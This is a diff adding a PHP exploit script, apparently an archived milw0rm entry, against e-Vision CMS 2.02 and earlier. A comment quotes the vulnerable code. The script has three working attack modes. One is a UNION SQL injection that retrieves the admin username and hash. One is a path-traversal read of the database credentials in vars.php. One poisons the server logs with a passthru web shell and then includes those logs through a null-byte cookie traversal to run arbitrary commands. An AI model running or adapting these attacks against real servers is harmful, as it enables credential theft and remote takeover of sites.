@@ -1,0 +1,299 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?php
+
+/*
+
+Explanation:
+
+Bug #1 (admin/show_img.php):
+
+#################
+#
+#	<?php
+#
+#	$fp = fopen($_GET['img'], "r");
+#	$img = fread($fp, filesize($_GET['img']));
+#	fclose($fp);
+#
+#	header("Content-type: ".$_GET['type']);
+#	echo $img;
+#
+#	?>
+#
+#################
+
+...need i say more?
+
+
+
+Bug #2 (admin/functions.php):
+
+#################
+#
+#	if ( isset($_COOKIE['adminlang']) ) { $language_selector = $_COOKIE['adminlang']; }
+#	else { $language_selector = "en"; }
+#	include("lang/".$language_selector.".php");
+#
+#################
+
+...speaks for it self really.
+
+
+
+Bug #3 ();
+
+#################
+#
+#	$sql = "SELECT `style_css` FROM `templates` WHERE `id`='".$_GET['template']."' AND `show`='Y' AND `trash`='N'";
+#	$result = mysql_query($sql) or die(mysql_error());
+#	$row = mysql_fetch_array($result);
+#	$css .= $row['style_css'];
+#
+#################
+
+...again appauling!
+
+*/
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+if ($argc<4) {
+print "-------------------------------------------------------------------------\r\n";
+print "    e-Vision CMS <= 2.02 SQL Injection/Remote Code Execution Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: w4ck1ng_evision.php [OPTION] [HOST] [PATH] ([USER] [PASS] [COMMAND])\r\n\r\n";
+print "[OPTION]  = 0 = SQL Injection (Admin user & hash retrieval)\r\n";
+print "            1 = Config File Disclosure (Database user & pass retrieval)\r\n";
+print "            2 = Remote Code Execution\r\n";
+print "[HOST] 	  = Target server's hostname or ip address\r\n";
+print "[PATH] 	  = Path where e-Vision CMS is located\r\n";
+print "[COMMAND] = Command to execute\r\n\r\n";
+print "e.g. w4ck1ng_evision.php 0 victim.com /\r\n";
+print "     w4ck1ng_evision.php 1 victim.com /\r\n";
+print "     w4ck1ng_evision.php 2 victim.com / username password \"ls -lia\"\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+die;
+}
+
+//Props to rgod for the following functions
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$exploit = $argv[1];
+$host = $argv[2];
+$path = $argv[3];
+$cmd  = $argv[4];
+$cmd  = urlencode($cmd);
+$port=80;$proxy="";
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+function head(){
+
+	print "-------------------------------------------------------------------------\r\n";
+	print "    e-Vision CMS <= 2.02 SQL Injection/Remote Code Execution Exploit\r\n";
+	print "-------------------------------------------------------------------------\r\n";
+
+		}
+
+function footer(){
+
+	print "-------------------------------------------------------------------------\r\n";
+	print "            		 http://www.w4ck1ng.com\r\n";
+	print "            		        ...Silentz\r\n";
+	print "-------------------------------------------------------------------------\r\n";
+		}
+
+if ($exploit==0){
+
+    head();
+   
+    $sql = "-999' UNION SELECT CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),pass) FROM users WHERE idusers=1 /*";
+    $sql = urlencode($sql);
+    $packet ="GET " . $path . "style.php?template=" . $sql . " HTTP/1.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    sendpacketii($packet);
+
+    if (strstr($html,"Username="))
+     {
+       $temp=explode("::Hash=",$html);
+       $temp2=explode("Username=",$temp[0]);
+
+	    echo "[+] Admin User: " . $temp2[1] . "\n";
+
+       $temp=explode("Username=",$html);
+       $temp2=explode("::Hash=",$temp[1]);
+
+	    echo "[+] Admin Hash: " . $temp2[1] . "\r\n";
+
+	footer();
+       die;
+     }
+
+else{die(); exit();}}
+
+if($exploit==1){
+
+    $sploit = "admin/show_img.php?img=../vars.php";
+    $packet ="GET " . $path . $sploit . " HTTP/1.1\r\n";
+    $packet.="Host: " . $host . "\r\n";
+    $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    sendpacketii($packet);
+
+    if (strstr($html,"<?"))
+     {
+
+    	$temp = explode("\$db_user = \"",$html);
+    	$temp2 = explode("\";",$temp[1]);
+    		$username = $temp2[0];
+
+   	$temp = explode("\$db_pass = \"",$html);
+   	$temp2 = explode("\";",$temp[1]);
+   		$password = $temp2[0];
+
+   	head();
+   	print "[+] Database User: " . $username . "\r\n";
+   	print "[+] Database Password: " . $password . "\r\n";
+    	footer();
+ }
+
+else{die(); exit();}
+
+}
+
+if($exploit==2){
+
+$code="<?php echo w4ckw4ck;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}passthru(\$_GET[cmd]);die;?>";
+$packet="GET " . $p . $code . " HTTP/1.0\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
+$packet.="Host: " . $host . "\r\n";
+$packet.="Connection: close\r\n\r\n";
+
+sendpacketii($packet);
+
+$paths= array (
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../../../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log"
+);
+
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+$a=$i+2;
+
+$packet ="GET " . $p . "admin/functions.php?cmd=" . $cmd . " HTTP/1.1\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
+$packet.="Host: " . $host . "\r\n"; 
+$packet.="Cookie: adminlang=" . $paths[$i] . "%00\r\n"; 
+$packet.="Connection: Close\r\n\r\n";
+
+sendpacketii($packet);
+
+if (strstr($html,"w4ckw4ck"))
+    {
+     $temp=explode("w4ckw4ck",$html);
+	head();
+        echo $temp[1];
+	footer();
+	exit;
+    }
+}
+
+	head();
+        echo "[-] Exploit Failed...\r\n";
+	footer();
+
+}
+
+?>
+
+# milw0rm.com [2007-06-08]
